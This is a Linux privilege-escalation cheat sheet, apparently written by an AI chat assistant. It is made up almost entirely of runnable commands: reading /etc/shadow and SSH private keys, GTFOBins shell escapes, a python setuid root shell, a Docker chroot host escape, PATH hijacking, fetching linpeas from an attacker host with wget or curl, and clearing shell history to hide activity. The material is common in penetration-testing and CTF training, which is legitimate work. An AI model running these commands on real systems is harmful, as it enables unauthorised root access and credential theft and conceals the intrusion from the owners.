
---

## 🔍 1. **System Information Enumeration**

```bash
uname -a
cat /etc/os-release
hostnamectl
id
whoami
sudo -l
```

---

## 📁 2. **Check File & Directory Permissions**

```bash
find / -perm -4000 2>/dev/null           # SUID files
find / -perm -2000 2>/dev/null           # SGID files
find / -writable -type d 2>/dev/null     # World-writable directories
find / -name "*.*history" 2>/dev/null    # Bash history files
```

---

## 🧪 3. **Sudo Misconfigurations**

```bash
sudo -l
```

**Exploits:**

- **Run as root without password:**
    
    ```bash
    sudo su
    sudo -i
    ```
    
- **Run specific commands (GTFOBins):**  
    If `sudo` can run a command like `less`, `vim`, `find`, `awk`, etc.:
    
    ```bash
    sudo <binary>    # Check on https://gtfobins.github.io/
    ```
    

---

## 🔓 4. **SUID Binaries**

```bash
find / -perm -u=s -type f 2>/dev/null
```

**Exploit with GTFOBins:**

```bash
# Example
/usr/bin/find . -exec /bin/sh \; -quit
```

---

## 📦 5. **Interesting Files with Credentials**

```bash
cat /etc/passwd
cat /etc/shadow     # If accessible
cat ~/.ssh/id_rsa
cat ~/.bash_history
grep -r "password" /home/* 2>/dev/null
```

---

## ⚙️ 6. **Scheduled Jobs (Cron Jobs)**

```bash
cat /etc/crontab
ls -la /etc/cron*
```

**Look for:**

- Writable scripts being run as root
    
- Output redirection to world-writable files
    

---

## 🛠️ 7. **Services & Processes**

```bash
ps aux
netstat -tulpn
```

- Look for root-owned processes you can interact with
    
- Check misconfigured services (e.g., running backups via scripts you can edit)
    

---

## 💉 8. **Kernel Exploits**

```bash
uname -r
```

Search for local exploits using [https://www.linuxkernelcves.com/](https://www.linuxkernelcves.com/) or [https://github.com/lucyoa/kernel-exploits](https://github.com/lucyoa/kernel-exploits)

---

## 🧰 9. **Docker / LXC Escape**

Check if inside a container:

```bash
cat /proc/1/cgroup
```

If you're in a container but can run Docker on the host:

```bash
docker run -v /:/mnt --rm -it alpine chroot /mnt sh
```

---

## 📚 10. **Useful Tools**

Install or look for these on the system:

- `linpeas.sh`
    
- `les.sh`
    
- `linux-exploit-suggester.sh`
    
- `pspy` (for process spying)
    
- `GTFOBins`
    

---

## 🔧 11. **Writable `PATH` Abuse**

Check if user-writable directory is in `PATH`:

```bash
echo $PATH
```

Exploit:

```bash
echo -e '#!/bin/bash\n/bin/bash' > /tmp/fakebinary
chmod +x /tmp/fakebinary
export PATH=/tmp:$PATH
some_command     # If root executes it
```

---

## 🧠 12. **Capabilities (capsh)**

```bash
getcap -r / 2>/dev/null
```

Example:

```bash
/usr/bin/python3.8 = cap_setuid+ep
# Exploit:
python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'
```

---

## 🧨 13. **NFS / FSTAB / Mount Privileges**

Check `/etc/fstab` and mount permissions:

```bash
cat /etc/fstab
mount
```

If you can mount with `uid=0`, you may be able to escalate.

---

## 🧼 14. **Clean-Up (Post Exploit)**

```bash
history -c
unset HISTFILE
rm -f /tmp/*exploit*
```

---

### 🚀 BONUS: Tools to Upload

```bash
wget http://<ip>/linpeas.sh
curl http://<ip>/linpeas.sh -o linpeas.sh
python3 -m http.server 80  # On your machine
```

---

Let me know if you want this as a downloadable PDF or Markdown file!